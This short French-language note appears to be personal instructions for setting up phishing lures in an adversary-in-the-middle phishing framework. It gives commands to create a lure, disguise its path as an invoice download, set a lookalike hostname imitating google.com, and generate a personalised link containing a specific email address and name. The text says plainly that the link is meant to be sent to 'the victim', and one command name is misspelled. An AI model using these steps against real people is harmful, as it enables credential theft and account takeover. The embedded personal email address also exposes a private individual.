Personnaliser un leurs apres l'avoir genere, c'est le lien qui sera envoyer a la victime

```c
lures create metasploitable
lures get-url 0
lures
```

```
lurel edit 0 [PARAM_NAME] VALUE
```

```c
lures edit 0 path /download/invoice/00554/
```

Pour changer le nom apres le `https://` ET doit toujours se terminer par le **domaine** configurer dans `evil` avec la commande `config`

```c
lures edit 0 hostname google.com.fake.com
```

```c
lures get-url 0 email=dipeuaberthold@gmail.com name=dipeua
```